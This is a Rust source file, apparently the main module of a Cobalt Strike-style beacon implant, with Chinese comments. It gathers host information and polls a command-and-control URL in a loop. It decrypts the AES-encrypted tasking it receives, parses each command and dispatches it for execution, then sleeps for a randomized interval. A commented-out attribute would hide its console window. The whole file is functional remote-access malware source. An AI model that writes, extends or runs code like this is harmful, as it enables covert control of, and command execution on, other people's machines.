// #![windows_subsystem = "windows"]
#![allow(internal_features)]
#![feature(c_variadic)]
#![feature(core_intrinsics)]

use std::io::{Cursor, Write};
use std::process;
use std::sync::atomic::AtomicU32;
use std::sync::LazyLock;

use byteorder::{ReadBytesExt, WriteBytesExt, BE};
use rsa::{pkcs8::DecodePublicKey, PublicKey};
use sha2::Digest;

use config::{AES_IV, C2_GET_URL, USER_AGENT};

use crate::beacon::init::Beacon;
use crate::beacon::sleep;
use crate::util::crypt::aes_decrypt;
use crate::util::data_parse::{beacon_read_bytes, beacon_read_i32};
use crate::util::jobs::command_handle;
use crate::util::strike::Strike;

mod beacon;
mod config;
mod util;

static BEACON: LazyLock<Beacon> = LazyLock::new(|| Beacon::init());
static COUNTER: AtomicU32 = AtomicU32::new(0);

fn main() {
    let cookie = BEACON
        // 获取操作系统板本
        .collect_info()
        .unwrap_or_else(|err| {
            // eprintln!("Error collecting info: {}", err);
            std::process::exit(1); // Exit with an error code
        });

    // 仅在 debug 模式下打印
    if cfg!(debug_assertions) {
        println!("Starting connect to {}", C2_GET_URL);
    }

    loop {
        let http_res = Strike::get_request(C2_GET_URL, &cookie, USER_AGENT);
        if let Ok(res) = http_res {
            let content_length = res.content_length().unwrap_or(0) as usize;

            if content_length > 0 {
                // println!("Get response with size={}", content_length);
                let content = res.bytes().unwrap();
                let rest_bytes = &content[..content_length - 16];
                // AES IV
                let iv = AES_IV;

                match aes_decrypt(rest_bytes, &BEACON.aes_key, iv) {
                    Ok(decrypted) => {
                        // 仅在 debug 模式下打印
                        if cfg!(debug_assertions) {
                            println!("Hex dump");
                            hexdump::hexdump(&decrypted);
                        }

                        let mut decrypted_cursor = Cursor::new(decrypted);

                        let _timestamp =
                            beacon_read_i32(&mut decrypted_cursor).unwrap_or_else(|err| {
                                // eprintln!("Error reading timestamp: {}", err);
                                0 // Default or error value
                            });
                        let _cmd_len1 =
                            beacon_read_i32(&mut decrypted_cursor).unwrap_or_else(|err| {
                                // eprintln!("Error reading command length: {}", err);
                                0 // Default or error value
                            });

                        // println!("Join while");
                        while (decrypted_cursor.position() as usize)
                            < decrypted_cursor.get_ref().len() - 16
                        {
                            let cmd_type =
                                decrypted_cursor.read_u32::<BE>().unwrap_or_else(|err| {
                                    // eprintln!("Error reading command type: {}", err);
                                    0 // Default or error value
                                });
                            let cmd_len =
                                beacon_read_i32(&mut decrypted_cursor).unwrap_or_else(|err| {
                                    // eprintln!("Error reading command length: {}", err);
                                    0 // Default or error value
                                });
                            let cmd_buf =
                                beacon_read_bytes(&mut decrypted_cursor, cmd_len as usize)
                                    .unwrap_or_else(|err| {
                                        // eprintln!("Error reading command buffer: {}", err);
                                        vec![] // Default or error value
                                    });

                            let mut cmd = Cursor::new(Vec::new());
                            cmd.write_i32::<BE>(cmd_len).unwrap_or_else(|err| {
                                // eprintln!("Error writing command length: {}", err);
                            });
                            cmd.write_all(&cmd_buf).unwrap_or_else(|err| {
                                // eprintln!("Error writing command buffer: {}", err);
                            });
                            cmd.set_position(0);

                            // 仅在 debug 模式下打印
                            if cfg!(debug_assertions) {
                                // 处理命令
                                println!("cmd_type: {}", cmd_type);
                                println!("cmd: {:?}", cmd);
                            }

                            command_handle(cmd_type, cmd);
                        }
                    }
                    Err(err) => {
                        // eprintln!("Decryption error: {:?}", err);
                    }
                }
            } else {
                // println!("Heartbeat...");
            }
        } else {
            // eprintln!("error: {:?}", http_res.err());
        }
        // 随机sleep
        // let value = sleep::get_global_var();
        // println!("Global variable: {}", value); // 输出全局变量

        std::thread::sleep(std::time::Duration::from_secs(sleep::beacon_sleep_run()));
    }
}
